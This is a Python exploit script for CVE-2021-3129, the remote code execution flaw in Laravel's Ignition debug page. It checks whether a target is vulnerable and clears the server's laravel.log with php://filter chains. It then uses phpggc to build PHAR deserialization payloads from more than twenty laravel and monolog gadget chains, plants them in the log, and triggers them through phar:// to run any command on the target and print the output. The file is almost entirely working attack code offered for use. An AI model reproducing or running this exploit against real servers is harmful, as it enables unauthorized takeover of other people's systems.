import argparse
import base64
import os
import re
from pyfiglet import Figlet
from colorama import Style, init,Fore
from urllib.parse import urljoin
import urllib3
import requests
urllib3.disable_warnings() # 屏蔽证书警告
init(autoreset=True)


chains =[    "laravel/rce1", "laravel/rce2", "laravel/rce3", "laravel/rce4", 
    "laravel/rce5","laravel/rce6","laravel/rce7", "laravel/rce8", 
    "laravel/rce9", "laravel/rce10", "laravel/rce11", "laravel/rce12", 
    "laravel/rce13", "laravel/rce14", "laravel/rce15", "laravel/rce16", 
    "monolog/rce1", "monolog/rce2", "monolog/rce3", "monolog/rce4","monolog/rce5", 
    "monolog/rce6", "monolog/rce7", "monolog/rce8", "monolog/rce9"
]


def pgpggc(url,cmd,chain):
    phar_name = chain.replace("/", "-") + ".phar"
    phar_path = f"/tmp/{phar_name}"
    command = f"php -d 'phar.readonly=0' ./phpggc {chain} system '{cmd}' --phar phar -o {phar_path}"

    if chain in ['laravel/rce5', 'laravel/rce6']:
        command = f"php -d 'phar.readonly=0' ./phpggc {chain} \"system('{cmd}');\" --phar phar -o {phar_path}"

    elif chain in ['monolog/rce4']:
        command = f"php -d 'phar.readonly=0' ./phpggc {chain} '{cmd}' --phar phar -o {phar_path}"

    os.system(command)

    if os.path.exists(phar_path):
        payload_data = open(phar_path, 'rb').read()
        payload_data = base64.b64encode(payload_data).decode().rstrip('=')
        payload_data = ''.join(c + '=00' for c in payload_data)
        payload_data = 'A' * 16 + payload_data
        payload_data = payload_data.replace("\n", "") + "A"
        print(f"{Fore.LIGHTMAGENTA_EX}当前利用链为{chain}")
        cleanlog(url)
        print(f"{Fore.GREEN}正在构造payload")
        playoad1(url)
        playload2(url,payload_data)
        playload3(url)
        playoad4(url)
    

def poc(url):
    target = urljoin(url,'_ignition/execute-solution')
    res = requests.get(url=target,verify=False)
    if res.status_code != 405 and "laravel" not in res.text:
        print(f"{url} [-]漏洞不存在")
        exit()
    else:
        print(f"{url} [+]漏洞存在")
    
    
def cleanlog(url):
    target = urljoin(url,'_ignition/execute-solution')
    header = {
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    data = {
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {
                "variableName": "cve20213129",
                "viewFile": "php://filter/write=convert.iconv.utf-8.utf-16be|convert.quoted-printable-encode|convert.iconv.utf-16be.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
            }
        }
    response = requests.post(url=target, headers=header, verify=False, json=data)
    response2 = requests.post(url=target, headers=header, verify=False, json=data)
    print(f'{Fore.GREEN}正在清空laravel.log日志文件')
def playoad1(url):
    target = urljoin(url,'_ignition/execute-solution')
    header = {
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    data1 = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "cve20213129",
            "viewFile": "AA"
        }
    }
    response = requests.post(url=target, headers=header, verify=False, json=data1)  
def playload2(url,payload_data):
    target = urljoin(url,'_ignition/execute-solution')
    header = {
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    data2 = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "cve20213129",
            "viewFile": ""
        }
    }
    data2["parameters"]["viewFile"] = payload_data
    response = requests.post(url=target, headers=header, verify=False, json=data2)
def playload3(url):
    target = urljoin(url,'_ignition/execute-solution')
    header = {
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    data1 = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "cve20213129",
            "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
        }
    }
    response = requests.post(url=target, headers=header, verify=False, json=data1)

def playoad4(url):
    target = urljoin(url,'_ignition/execute-solution')
    header = {
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    data1 = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "cve20213129",
            "viewFile": "phar://../storage/logs/laravel.log/test.txt"
        }
    }
    response = requests.post(url=target, headers=header, verify=False, json=data1)
    result = re.sub(r"\{[\s\S]*\}", "", response.text)
    if result:
        print(f"{Fore.GREEN}Result:")
        print(result)
    else:
        print("[-] There is no output")

if __name__ == "__main__":
    f=Figlet(font='doom')
    print('\033[31m====================================================\033[0m')
    print('\033[34m{}\033[0m'.format(f.renderText('xk-exp')))
    print('\033[31m====================================================\033[0m'+'\n')
    parser = argparse.ArgumentParser(description='Exploit CVE-2021-3129 - Laravel vulnerability exploit script')
    parser.add_argument('-u','--url',help='python3 CVE-2021-3129.py -u http://127.0.0.1:80 eg: only poc')
    parser.add_argument('-c','--cmd',help='python3 CVE-2021-3129.py -u http://127.0.0.1:80 -c whoami',required=False)
    parser.add_argument('-chain','--chain',help='python3 CVE-2021-3129.py -u http://127.0.0.1:80 -c whoami -chain laravel/rce1',required=False)
    args = parser.parse_args()
    if args.url:
        poc(args.url)
        if args.chain:
            pgpggc(args.url, args.cmd, args.chain)
        else:
            for chain in chains:
                pgpggc(args.url, args.cmd, chain)
